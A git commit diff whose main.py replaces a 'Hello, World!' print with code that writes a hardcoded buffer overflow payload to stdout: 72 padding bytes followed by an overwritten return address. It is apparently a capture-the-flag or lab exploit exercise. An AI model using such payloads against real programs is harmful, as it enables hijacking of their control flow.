2ea04f21bdf9abdfc6bbb50fc8bdd3840c771e0e
Eric Zou <ezou626@gmail.com>
2025-04-23 02:15:09 -0400

    hardcoded payload delivery

--- main.py
+++ main.py
@@ -1,4 +1,8 @@
 #!/usr/bin/env python3
 
+import sys
+
+payload = b"A" * 72 + b"\xa0\x11\x40\x00\x00\x00\x00\x00"
+
 if __name__ == '__main__':
-    print("Hello, World!")
+    sys.stdout.buffer.write(payload)
